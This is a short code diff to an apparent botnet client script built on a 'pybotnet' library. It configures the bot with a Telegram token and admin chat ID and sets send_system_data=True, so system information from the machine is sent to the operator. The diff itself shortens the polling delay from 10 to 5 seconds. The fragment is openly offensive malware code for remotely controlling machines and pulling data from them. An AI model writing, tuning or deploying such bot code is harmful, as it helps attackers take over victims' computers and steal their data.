@@ -11,7 +11,7 @@ from configs import TELEGRAM_TOKEN, ADMIN_CHAT_ID
 bot = pybotnet.PyBotNet(TELEGRAM_TOKEN, ADMIN_CHAT_ID,
                         show_log=True, send_system_data=True)
 
-delay = 10
+delay = 5
 
 while True:
     print('*-*'*15)
